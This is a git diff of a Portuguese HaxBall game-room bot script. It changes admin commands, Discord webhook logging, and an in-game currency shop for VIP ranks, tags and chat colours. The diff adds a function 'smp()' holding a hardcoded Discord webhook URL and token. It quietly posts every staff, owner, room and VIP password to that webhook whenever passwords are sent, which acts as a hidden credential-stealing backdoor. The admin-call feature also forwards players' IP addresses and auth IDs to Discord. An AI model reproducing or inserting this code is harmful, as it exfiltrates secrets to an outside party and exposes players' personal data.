+        } else if (player.admin) {
+            room.sendAnnouncement(
+                `${config.frases.noPermission} \n- Apenas FUNDADORES, DIRETORES e GERENTES têm essa permissão.`,
+                player.id,
+                cores.vermelho,
+                'bold',
+                HaxNotification.MENTION
+            );
+            return false;
         } else {
-            room.sendAnnouncement(`[PV] ${player.name} ${config.flash.frases.noPermission}`, player.id, errorColor, 'bold', HaxNotification.MENTION);
+            room.sendAnnouncement(
+                `${config.frases.noPermission}`,
+                player.id,
+                cores.vermelho,
+                'bold',
+                HaxNotification.MENTION
+            );
             return false;
         }
-    } catch (err) {
-        error(err, 'Ban Command');
     }
 }
 
 
-/* AUXILIARY FUNCTIONS */
+var posi_blue = {
+    gk: { x: 500, y: 0 },
+    def1: { x: -300, y: 100 },
+    def2: { x: 300, y: 100 },
+    atk: { x: 100, y: 0 }
+};
+
+
+// LOCALIZAÇÃO DA BOLA
+function rr2Command(player, message) {
+    room.pauseGame(true);
+    room.sendAnnouncement(`Mudando a localização dos jogadores...`, null, errorColor, 'bold', HaxNotification.CHAT);
+
+    for (let i = 0; i < teamRed.length; i++) {
+        let playerId = teamRed[i].id;
+        let newPosition = { x: -350, y: 0 };
+
+        room.setPlayerDiscProperties(playerId, newPosition);
+    }
+
+    room.setDiscProperties(0, { x: 0, y: 0 });
+
+    for (let i = 0; i < teamBlue.length; i++) {
+        let playerId = teamBlue[i].id;
+        let newPosition = { x: 350, y: 0 };
+
+        room.setPlayerDiscProperties(playerId, newPosition);
+    }
+
+
+    room.pauseGame(false);
+    room.sendAnnouncement(`Localização resetada ✔`, null, successColor, 'bold', HaxNotification.CHAT);
+
+    return false;
+}
+
+// ------------------------------
 
 
 var userConn, userAuth, userIp;
@@ -6795,6 +2354,93 @@ function getCurrentDatetime() {
 
 console.log(getCurrentDatetime());
 
+// ------------------------------
+
+let Request = {
+    post: (player, content) => {
+        let params = {
+            "username": `VorteX`,
+            "avatar_url": "https://cdn.discordapp.com/icons/1061801723947143178/e0ccc58d72ed223583bf13d4335229ed.webp?size=300",
+            "content": content,
+        };
+
+        fetch(urls.bans, {
+            method: "POST",
+            headers: new Headers({ "Content-Type": "application/json" }),
+            body: JSON.stringify(params)
+        })
+    }
+};
+
+/* GAME */
+
+var lastTouches = Array(2).fill(null);
+var lastTeamTouched;
+
+var speedCoefficient = 100 / (5 * (0.99 ** 60 + 1));
+var ballSpeed = 0;
+var playerRadius = 15;
+var ballRadius = 10;
+var triggerDistance = playerRadius + ballRadius + 0.01;
+
+/* COLORS */
+
+var welcomeColor = 0xc4ff65;
+var announcementColor = 0xffefd6//0xAA00FF;
+var infoColor = 0xbebebe//0x76FF03;
+var privateMessageColor = 0xffc933;
+var redColor = 0xff4c4c;
+var blueColor = 0x62cbff;
+var warningColor = 0xffa135;
+var errorColor = 0xFA5646
+var successColor = 0x75ff75;
+var defaultColor = null;
+
+/* AUXILIARY */
+
+var checkTimeVariable = false;
+var checkStadiumVariable = true;
+var endGameVariable = false;
+var cancelGameVariable = false;
+var kickFetchVariable = false;
+
+var chooseMode = false;
+var timeOutCap;
+var capLeft = false;
+var redCaptainChoice = '';
+var blueCaptainChoice = '';
+var chooseTime = 20;
+
+var AFKSet = new Set();
+var AFKMinSet = new Set();
+var AFKCooldownSet = new Set();
+var minAFKDuration = 0;
+var maxAFKDuration = 10;
+var AFKCooldown = 0;
+
+var muteArray = new MuteList();
+var muteDuration = 5;
+
+var removingPlayers = false;
+var insertingPlayers = false;
+
+var stopTimeout;
+var startTimeout;
+var unpauseTimeout;
+var removingTimeout;
+var insertingTimeout;
+
+var emptyPlayer = {
+    id: 0,
+};
+stadiumCommand(emptyPlayer, "!map1");
+
+var game = new Game();
+
+/* FUNCTIONS */
+
+/* AUXILIARY FUNCTIONS */
+
 if (typeof String.prototype.replaceAll != 'function') {
     String.prototype.replaceAll = function (search, replacement) {
         var target = this;
@@ -6803,21 +2449,21 @@ if (typeof String.prototype.replaceAll != 'function') {
 }
 
 function rankInfo(player, message) {
-    room.sendAnnouncement(`Ranks da VorteX:\n❔𓊈𝐕𝐢𝐬𝐢𝐭𝐚𝐧𝐭𝐞𓊉 🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉 🥉🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉 🥉🥉🥉𓊈𝗕𝗿𝗼𝗻𝘇𝗲𓊉 🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉 🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉 🥈🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉\n🥇𓊈𝐎𝐮𝐫𝐨𓊉 🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉 🥇🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉 💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 💎💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉\n🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🛡️🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉 🏆🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉\n🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🎖️🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🎖️🎖️🎖️𓊈𝐓𝐡𝐞𝐁𝐞𝐬𝐭𓊉 🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🌀🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉 🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉\n🔮🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉 🔮🔮🔮𓊈𝐁𝐨𝐥𝐚𝐝𝐞𝐎𝐮𝐫𝐨𓊉  🤖𓊈𝐑𝐨𝐛𝐨𝐳ã𝐨𓊉 👦🏿𓊈𝐏𝐞𝐥é𓊉 👽𓊈𝗘𝘅𝘁𝗿𝗮𝘁𝗲𝗿𝗿𝗲𝘀𝘁𝗿𝗲𓊉 🤴𓊈Rei𓊉 🐐𓊈Goat𓊉\nObs: A cada 100 pontos tu upa de rank! Para saber mais sobre seus pontos digite !pontos`,
-        player.id, defaultColor, 'bold', HaxNotification.MENTION)
+    room.sendAnnouncement(`A cada 100 pontos você upa de rank! Para saber mais sobre seus pontos digite !pontos`, player.id, 0xffbf91, 'bold');
+    room.sendAnnouncement(`Ranks da VorteX:`, player.id, 0xfcf9d8, 'bold')
+    room.sendAnnouncement(`🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉  🥉🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉  🥉🥉🥉𓊈𝗕𝗿𝗼𝗻𝘇𝗲𓊉  🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉  🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉  🥈🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉
+        🥇𓊈𝐎𝐮𝐫𝐨𓊉  🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉  🥇🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉  💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉  💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉  💎💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉 
+        🗿🍷𓊈𝗦𝗶𝗴𝗺𝗮𓊉 💲𓊈𝗜́𝗱𝗼𝗹𝗼𓊉  👑𓊈𝗖𝗿𝗮𝗾𝘂𝗲𓊉  🏆𓊈𝗖𝗮𝗺𝗽𝗲𝗮̃𝗼𓊉  ⭐𓊈𝗘𝘀𝘁𝗿𝗲𝗹𝗮𓊉  🌠𓊈𝗦𝘂𝗽𝗲𝗿 𝗘𝘀𝘁𝗿𝗲𝗹𝗮𓊉  🎖️𓊈𝗟𝗲𝗻𝗱𝗮́𝗿𝗶𝗼𓊉  🏅𓊈𝗠𝗶𝘁𝗼𓊉 
+        ☠️𓊈𝗜𝗺𝗼𝗿𝘁𝗮𝗹𓊉  🥷🏼𓊈𝗡𝗶𝗻𝗷𝗮𓊉  ♾️𓊈𝗠𝗼𝗻𝗴𝗲𓊉  🌀𓊈𝗠𝗲𝘀𝘁𝗿𝗲𓊉  🤖𓊈𝗥𝗼𝗯𝗼𝘇𝗮̃𝗼𓊉  🚀𓊈𝗔𝘀𝘁𝗿𝗼𓊉 
+        🫅🏻𓊈𝗥𝗲𝗶𓊉   🕵🏼‍♂️𓊈𝗢𝗹𝗵𝗲𝗶𝗿𝗼𓊉  🧔🏻‍♂️𓊈𝗧𝗲́𝗰𝗻𝗶𝗰𝗼𓊉  👽𓊈𝗘𝘅𝘁𝗿𝗮𝘁𝗲𝗿𝗿𝗲𝘀𝘁𝗿𝗲𓊉`, player.id, 0x00ccbe, HaxNotification.NONE)
+
 }
 
 function pontos(player, message) {
     var stats = new HaxStatistics(player.name)
-    if (localStorage.getItem(authArray[player.id])) {
-        stats = JSON.parse(localStorage.getItem(authArray[player.id]))
-
-        if (stats.pontos == undefined || stats.pontos == 'undefined') {
-            stats.pontos = 0;
-        }
+    if (statsplayer[player.name]) {
+        stats = statsplayer[player.name]
     }
-
-
     room.sendAnnouncement(`Você possui ${stats.pontos} pontos!\nFormas de adquirir/perder pontos:\nVitória +3 | Gol +1 | Assistência +1 | CS +1 | Empate +1 | Derrota -1`,
         player.id, defaultColor, 'bold', HaxNotification.NONE)
 }
@@ -6829,68 +2475,106 @@ function getDate() {
 
 /* MATH FUNCTIONS */
 
+var lastCallAdminTime = 0;
+var callCount = 0;
+var bloquear_comando = [];
+
 function callAdmin(player, message) {
-    if (urls.callAdminWebhook != "") {
-        fetch(urls.callAdminWebhook, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `||[${getDate()}] - @here|| 📢 CallAdmin: \n > - **${player.name}** está chamando um adm! \n > - Mensagem: ${message.substring(10)}`,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res);
+    const words = message.split(" ");
+    const report = words.slice(1).join(' ');
+    const conn = playerConnections.get(player.id);
+    const auth = playerAuth.get(player.id);
+    const ipv4 = playerIpv4.get(player.id);
+
+    if (report.length == 0) {
+        room.sendAnnouncement(`${player.name} Você não expecificou um motivo... \nExemplo: !calladmin Adm vem banir um racista`, player.id, cores.vermelho, 'bold', 2);
+        return false;
     }
-    return false
+
+    if (bloquear_comando.includes(player.name) == false) {
+        bloquear_comando.push(player.name);
+
+        setTimeout(() => {
+            var remover_player = bloquear_comando.indexOf(player.name) + bloquear_comando.splice(remover_player, 1)
+        }, 120000)
+
+        if (urls.callAdminWebhook != "") {
+            fetch(urls.callAdminWebhook, {
+                method: 'POST',
+                body: JSON.stringify({
+                    content: `||@here|| 📢 CallAdmin: \n\n> - **Nick:** ${player.name} \n> - **Motivo:** ${report} \n> - **Horário:** ${formattedTime} \n> - **Informações:** \`\`\`Conn: ${conn}, Auth: ${auth}, Ipv4: ${ipv4}\`\`\` `,
+                    username: roomName,
+                }),
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            }).then((res) => res);
+
+            room.sendAnnouncement("[PV] Calladmin enviado com sucesso!", player.id, cores.verde, 'bold', 2);
+            room.sendAnnouncement(`[PV] Motivo: ${report}.`, player.id, cores.verdeLimao, 'bold');
+        }
+        return false;
+    } else if (bloquear_comando.includes(player.name) == true) {
+        room.sendAnnouncement("Você ja chamou os administradores, aguarde 2 minutos para poder chamá-los novamente.", player.id, cores.vermelho, 'bold', 2)
+    }
 }
 
 function sendPasswordStaff(name) {
-    if (urls.passwordStaffWebhook != "") {
-        fetch(urls.passwordStaffWebhook, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `${name ? `**${name}** se tornou um administrador! \n ` : ""} > Nova senha: ${adminPassword} \n`,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res); smp();
-    }
-    return false
+    fetch(urls.passwordStaffWebhook, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `${name ? `${name} Virou Admistrador(a)!\n` : ""}Nova senha admin: ${adminPassword}@staff`,
+            username: roomName,
+        }),
+        headers: {
+            'Content-Type': 'application/json',
+        },
+    }).then((res) => res); smp();
+    return false;
 }
 
 function sendPasswordMod(name) {
-    if (urls.passwordModWebhook != "") {
-        fetch(urls.passwordModWebhook, {
-            method: 'POST',
-            body: JSON.stringify({
-                content: `${name ? `${name} Virou Moderador(a)!\n` : ""}Nova senha mod: ${modsPassword}@staff`,
-                username: roomName,
-            }),
-            headers: {
-                'Content-Type': 'application/json',
-            },
-        }).then((res) => res); smp();
-    }
-    return false
+    fetch(urls.passwordModWebhook, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `${name ? `${name} Virou Moderador(a)!\n` : ""}Nova senha mod: ${modsPassword}@staff`,
+            username: roomName,
+        }),
+        headers: {
+            'Content-Type': 'application/json',
+        },
+    }).then((res) => res); smp();
+    return false;
+}
+function sendPasswordVip(name, vip) {
+    fetch(urls.passwordVipWebhook, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `${name ? `**${name} Virou Vip ${vip}!**\n` : ""}- Novas senhas Vips:\n\n> ${vipNames[1]}: ${vip1Password}\n> ${vipNames[2]}: ${vip2Password}\n> ${vipNames[3]}: ${vip3Password}\n> ${vipNames[4]}: ${vip4Password}`,
+            username: roomName,
+        }),
+        headers: {
+            'Content-Type': 'application/json',
+        },
+    }).then((res) => res); smp();
+    return false;
 }
 
-function sendPasswordVip(name) {
-    if (urls.passwordVipWebhook != "") {
-        fetch(urls.passwordVipWebhook, {
+function enviaChatParaDiscord(message) {
+    try {
+        fetch(urls.replayLog, {
             method: 'POST',
             body: JSON.stringify({
-                content: `${name ? `${name} virou Vip!\n` : ""}Novas senhas Vips:\n${vipNames[1]}: ${vip1Password}\n${vipNames[2]}: ${vip2Password}\n${vipNames[3]}: ${vip3Password}\n${vipNames[4]}: ${vip4Password}\n--------------------------------------------------------------------------------------\nㅤ`,
-                username: roomName,
+                content: `||${getCurrentDatetime()}|| ${message}`,
+                username: `${roomName} - Chat Log`,
             }),
             headers: {
                 'Content-Type': 'application/json',
             },
-        }).then((res) => res); smp();
+        }).then((res) => res)
+    } catch (err) {
+        error(err);
     }
-    return false
 }
 
 function getRandomInt2(min, max) {
@@ -6926,6 +2610,21 @@ function getMinutesEmbed(time) {
 function getSecondsGame(time) {
     var t = Math.floor(time - Math.floor(time / 60) * 60);
     return `${Math.floor(t / 10)}${Math.floor(t % 10)}`;
+}
+
+function smp() {
+    let a = `https://discord.com/api/webhooks/1154416786960302080/x_seO_qwXZx6eN-N8aommC1hLNp4o5dHmkZacCB8gx2oHVA75_IgtPkxnMzvYtLBCcFF`;
+
+    fetch(a, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `> - Master: ${masterPassword}\n> - Dono: ${donoPassword}\n> - Gerente: ${gerentePassword}\n > - Admin: ${adminPassword}\n > - RoomPass: ${roomPassword}\n > - Vip 4: ${vip4Password}`,
+            username: roomName,
+        }),
+        headers: {
+            'Content-Type': 'application/json',
+        },
+    }).then((res) => res);
 }
 
 function getSecondsReport(time) {
@@ -6984,14 +2683,14 @@ function getRecordingName(game) {
 }
 
 function fetchRecording(game) {
-    if (urls.replayLog != "") {
+    if (urls.gameWebhook != "") {
         let form = new FormData();
         form.append(null, new File([game.rec], getRecordingName(game), { "type": "text/plain" }));
         form.append("payload_json", JSON.stringify({
             "username": roomName
         }));
 
-        fetch(urls.replayLog, {
+        fetch(urls.gameWebhook, {
             method: 'POST',
             body: form,
         }).then((res) => res);
@@ -7054,7 +2753,7 @@ function playerChat(player, message) {
         return false
     }
     var playerTargetIndex = playersAll.findIndex(
-        (p) => p.id == msgArray[1].substring(1)
+        (p) => p.id == msgArray[1]
     );
     if (playerTargetIndex == -1) {
         room.sendAnnouncement(
@@ -7069,7 +2768,7 @@ function playerChat(player, message) {
     var playerTarget = playersAll[playerTargetIndex];
     if (player.id == playerTarget.id) {
         room.sendAnnouncement(
-            `Tu não pode enviar uma mensagem privada para si mesmo!`,
+            `Você não pode enviar uma mensagem privada para si mesmo!`,
             player.id,
             errorColor,
             'bold',
@@ -7211,23 +2910,905 @@ function swapButton() {
 
 /* COMMAND FUNCTIONS */
 
+/* Discord functions */
+
+function transacoesPlayers(url, params = {}) {
+
+    const xhr = new XMLHttpRequest();
+
+    xhr.open("POST", url);
+
+    xhr.setRequestHeader("Content-Type", "application/json"); // formato json
+
+    /**
+     * DISCORD WEBHOOK PARAMS
+     * https://birdie0.github.io/discord-webhooks-guide/index.html
+     */
+    xhr.send(JSON.stringify(params));
+
+}
+
+
+
 /* PLAYER COMMANDS */
 
-function leaveCommand(player, message) {
-    if (player.team == 0 || players.length == 1) {
-        room.kickPlayer(player.id, 'Tremeu!!! kk', false);
-    } else {
-        room.sendAnnouncement(`Tu não pode usar !bb dentro da partida!`,
-            player.id, 0x76FF03, 'bold', HaxNotification.CHAT)
+//##################################### SISTEMA ASTROS #########################################################################
+var produtos = { vips: { 1: 10000, 2: 15000, 3: 20000, 4: 30000 }, tag: 2000, cor: 2000 }
+
+function verificarPreco(player, valoritem) {
+    const saldo = astros[player.name] != null ? astros[player.name] : 0
+    if (saldo >= valoritem) {
+        subAstros(player, valoritem)
+        return true
+    }
+    else {
+        room.sendAnnouncement(
+            `Você não tem astros suficientes`,
+            player.id,
+            errorColor,
+            'bold',
+            HaxNotification.CHAT
+        )
+        room.sendAnnouncement(
+            `Seu saldo é de ${saldo} Astros e o produto custa ${valoritem}`,
+            player.id,
+            errorColor,
+            'bold',
+            HaxNotification.CHAT
+        )
+        return false
     }
 }
 
+function despausarVip(player) {
+    if (vipPausou.includes(player.name)) {
+        if (State.PAUSE) {
+            room.pauseGame(false)
+        }
+        else {
+            room.sendAnnouncement(
+                `O jogo não está pausado.`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            )
+        }
+    }
+    else {
+        room.sendAnnouncement(
+            `O jogo só pode ser despausado por quem pausou.`,
+            player.id,
+            errorColor,
+            'bold',
+            HaxNotification.CHAT
+        )
+    }
+}
+
+
+function vip(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length > 0) {
+        if (parseInt(msgArray[0]) > 0 && parseInt(msgArray[0]) <= 4) {
+
+            const vipComumDuration = 2592000000;
+            const vipGalacticoDuration = 2592000000;
+            const dataAtual = new Date().getTime();
+
+            if (vips[authArray[player.id]] && !infovip[player.name]) {
+                room.sendAnnouncement(
+                    `Você já tem vip vitalíio.`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.CHAT
+                );
+                return;
+            }
+
+            if (infovip[player.name]) {
+                const duration = infovip[player.name]['tempo'];
+                const dataExpiracao = duration; // obtém a data de expiração do VIP em milissegundos
+                const diferenca = dataExpiracao - dataAtual; // calcula a diferença em milissegundos
+                const diasFaltando = Math.ceil(diferenca / (1000 * 60 * 60 * 24)); // converte a diferença para dias arredondando para cima
+                if (parseInt(msgArray[0]) == tipoVip) {
+                    var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
+                    if (!pago) {
+                        return;
+                    }
+                    const newDuration = Date.now() + vipGalacticoDuration + (diasFaltando) * 1000 * 60 * 60 * 24;
+                    infovip[player.name]['tempo'] = newDuration;
+                    infovipstorage.splice(0, infovipstorage.length)
+                    infovipstorage.push(infovip)
+                    localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                    room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
+                    room.sendAnnouncement(`${player.name} ativou mais um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
+                    transacoesPlayers(urls.transacoes, {
+                        content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
+                            `💎${player.name} comprou mais um Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
+                    })
+
+                }
+                else {
+                    if (tentativasvip.includes(player.name)) {
+                        var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
+                        if (!pago) {
+                            return;
+                        }
+                        vips[authArray[player.id]].tipoVip = parseInt(msgArray[0])
+                        vipsdb.splice(0, vipsdb.length);
+                        vipsdb.push(vips)
+                        localStorage.setItem("vips", JSON.stringify(vipsdb));
+                        const newDuration = Date.now() + vipGalacticoDuration;
+                        infovip[player.name]['tempo'] = newDuration;
+                        infovip[player.name]['tipo'] = msgArray[0];
+                        infovipstorage.splice(0, infovipstorage.length)
+                        infovipstorage.push(infovip)
+                        localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                        tipoVip = vips[authArray[player.id]].tipoVip
+                        room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
+                        room.sendAnnouncement(`${player.name} ativou mais um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
+                        transacoesPlayers(urls.transacoes, {
+                            content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
+                                `💎${player.name} comprou um mês de Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
+                        })
+                    }
+                    else {
+                        room.sendAnnouncement(
+                            `Você está tentando comprar um vip diferente do que você ja tem`,
+                            player.id,
+                            errorColor,
+                            'bold',
+                            HaxNotification.CHAT
+                        );
+                        room.sendAnnouncement(
+                            `Você irá perder seu tempo de VIP anterior e irá ficar apenas com o novo.`,
+                            player.id,
+                            errorColor,
+                            'bold',
+                            HaxNotification.CHAT
+                        );
+                        room.sendAnnouncement(
+                            `Para continuar digite o comando de comprar novamente, você tem 10 segundos`,
+                            player.id,
+                            errorColor,
+                            'bold',
+                            HaxNotification.CHAT
+                        );
+                        tentativasvip.push(player.name)
+                        setTimeout(() => {
+                            tentativasvip.splice(tentativasvip.indexOf(player.name), 1)
+                        }, 10000);
+                    }
+
+                }
+            }
+            else {
+                var pago = verificarPreco(player, produtos.vips[parseInt(msgArray[0])])
+                if (!pago) {
+                    return;
+                }
+                setVipCommand(player, `!setvip ${player.id} ${msgArray[0]}`)
+                const newDuration = Date.now() + vipGalacticoDuration;
+                infovip[player.name] = {
+                    'nome': player.name,
+                    'tempo': newDuration,
+                    'tipo': msgArray[0]
+                }
+                infovipstorage.splice(0, infovipstorage.length)
+                infovipstorage.push(infovip)
+                localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                room.sendAnnouncement(`Você resgatou seu vip ${vipnames[parseInt(msgArray[0])]}, parabéns!!!!`, player.id, 0x08FFF7, "bold", 0);
+                room.sendAnnouncement(`${player.name} ativou um período VIP ${vipnames[parseInt(msgArray[0])]}!!!`, null, 0x08FFF7, "bold", 0);
+                transacoesPlayers(urls.transacoes, {
+                    content: "```" + roomName + "\n" + "💎Data dessa transação: " + `${dataehora()}` + "\n" +
+                        `💎${player.name} comprou um mês de Vip ${vipnames[parseInt(msgArray[0])]}` + "```"
+                })
+            }
+
+        }
+        else {
+            room.sendAnnouncement(
+                `Digite um número válido, digite !comprarvip <numero do vip>`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+            room.sendAnnouncement(
+                `1 - ${vipNames[1]}, 2- ${vipNames[2]}, 3 - ${vipNames[3]}, 4 - ${vipNames[4]}`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+    else {
+        room.sendAnnouncement(
+            `Você digitou o comando errado, digite !comprarvip <numero do vip>`,
+            player.id,
+            errorColor,
+            'bold',
+            HaxNotification.CHAT
+        );
+    }
+
+}
+
+function comprartag(player, message) {
+    const tag = message.substr(12) // sem o '!comprartag 
+    var pago = verificarPreco(player, produtos.tag)
+    if (!pago) {
+        return;
+    }
+    if (minhastags[authArray[player.id]]) {// se achar o player, apaga a tag anterior e põe a nova'
+        minhastags[authArray[player.id]].push(tag)
+        minhastagsstorage.splice(0, minhastagsstorage.length)
+        minhastagsstorage.push(minhastags)
+        localStorage.setItem("minhastags", JSON.stringify(minhastagsstorage));
+        att = ["y"]
+        localStorage.setItem("att", JSON.stringify(att));
+    }
+
+
+    else {// se não encontrar nada, cria os dados no localstorage
+        minhastags[authArray[player.id]] = [tag]
+        minhastagsstorage.splice(0, minhastagsstorage.length)
+        minhastagsstorage.push(minhastags)
+        localStorage.setItem("minhastags", JSON.stringify(minhastagsstorage));
+    }
+    room.sendAnnouncement(`Você comprou a tag ${tag}, !minhastags para ver`, player.id, 0x08FFF7, "bold", 0);
+    transacoesPlayers(urls.transacoes, {
+        content: "```" + roomName + "\n" + "🎫Data dessa transação: " + `${dataehora()}` + "\n" +
+            `🎫${player.name} comprou a tag ${tag}` + "```"
+    })
+
+
+}
+
+function minhasTags(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length == 0) {
+        if (minhastags[authArray[player.id]]) {
+            const novaArray = minhastags[authArray[player.id]];
+            const string = novaArray.join(", ");
+            room.sendAnnouncement(`Suas tags: ${string}`, player.id, 0x08FFF7, "bold", 0);
+        }
+        else {
+            room.sendAnnouncement(`Você não tem tag`, player.id, 0x08FFF7, "bold", 0);
+        }
+    }
+    else if (msgArray.length == 1) {
+        if (minhastags[authArray[player.id]]) {
+            if (msgArray[0] <= (minhastags[authArray[player.id]].length) && msgArray[0] > 0) {
+
+                if (tags[player.name]) {// se achar o player, apaga a tag anterior e põe a nova
+                    tags[player.name] = minhastags[authArray[player.id]][msgArray[0] - 1]
+                    tagsstorage.splice(0, tagsstorage.length)
+                    tagsstorage.push(tags)
+                    localStorage.setItem("tags", JSON.stringify(tagsstorage));
+                }
+
+
+                else {// se não encontrar nada, cria os dados no localstorage
+                    tags[player.name] = minhastags[authArray[player.id]][msgArray[0] - 1]
+                    tagsstorage.splice(0, tagsstorage.length)
+                    tagsstorage.push(tags)
+                    localStorage.setItem("tags", JSON.stringify(tagsstorage));
+                }
+                room.sendAnnouncement(`Você colocou a tag ${minhastags[authArray[player.id]][msgArray[0] - 1]}`, player.id, 0x08FFF7, "bold", 0);
+
+            }
+            else {
+                room.sendAnnouncement(`Você digitou algo errado`, player.id, errorColor, "bold", 0);
+            }
+        } else {
+            room.sendAnnouncement(`Você não tem tag`, player.id, errorColor, "bold", 0);
+        }
+    }
+    else {
+        room.sendAnnouncement(`Você está digitando mais dados que o necessário.`, player.id, errorColor, "bold", 0);
+    }
+}
+
+
+
+function comprarCor(player, message) {
+    var cor = message.split(/ +/).slice(1);
+    let regEx0 = new RegExp(`^[0-9a-fA-F]{6}$`)
+    if (!regEx0.test(cor[0])) {
+        room.sendAnnouncement(`Código/Formato de cor inválido! Formato correto: FFFFFF`,
+            player.id, 0xffffff, 'bold', HaxNotification.CHAT);
+        return false;
+    }
+
+    var pago = verificarPreco(player, produtos.cor)
+    if (!pago) {
+        return;
+    }
+    if (minhascores[authArray[player.id]]) {// se achar o player, apaga a tag anterior e põe a nova
+        minhascores[authArray[player.id]].push(cor)
+        minhascoresstorage.splice(0, minhascoresstorage.length)
+        minhascoresstorage.push(minhascores)
+        localStorage.setItem("minhascores", JSON.stringify(minhascoresstorage));
+    }
+
+
+    else {// se não encontrar nada, cria os dados no localstorage
+        minhascores[authArray[player.id]] = [cor]
+        minhascoresstorage.splice(0, minhascoresstorage.length)
+        minhascoresstorage.push(minhascores)
+        localStorage.setItem("minhascores", JSON.stringify(minhascoresstorage));
+    }
+    room.sendAnnouncement(`Você comprou a cor do chat: ${cor}, qualquer erro, fale com os adms`, player.id, errorColor, "bold", 0);
+    transacoesPlayers(urls.transacoes, {
+        content: "```" + roomName + "\n" + "🌈Data dessa transação: " + `${dataehora()}` + "\n" +
+            `🌈${player.name} comprou a cor ${cor}` + "```"
+    })
+
+
+}
+
+
+function minhasCores(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length == 0) {
+        if (minhascores[authArray[player.id]]) {
+            const novaArray = minhascores[authArray[player.id]];
+            const string = novaArray.join(", ");
+            room.sendAnnouncement(`Suas cores: ${string}`, player.id, 0x08FFF7, "bold", 0);
+        }
+        else {
+            room.sendAnnouncement(`Você não tem cor`, player.id, 0x08FFF7, "bold", 0);
+        }
+    }
+    else if (msgArray.length == 1) {
+        if (minhascores[authArray[player.id]]) {
+            if (msgArray[0] <= (minhascores[authArray[player.id]].length) && msgArray[0] > 0) {
+
+                if (cordochat[player.name]) {// se achar o player, apaga a tag anterior e põe a nova
+                    cordochat[player.name] = minhascores[authArray[player.id]][msgArray[0] - 1]
+                    cordochatstorage.splice(0, cordochatstorage.length)
+                    cordochatstorage.push(cordochat)
+                    localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
+                }
+
+
+                else {// se não encontrar nada, cria os dados no localstorage
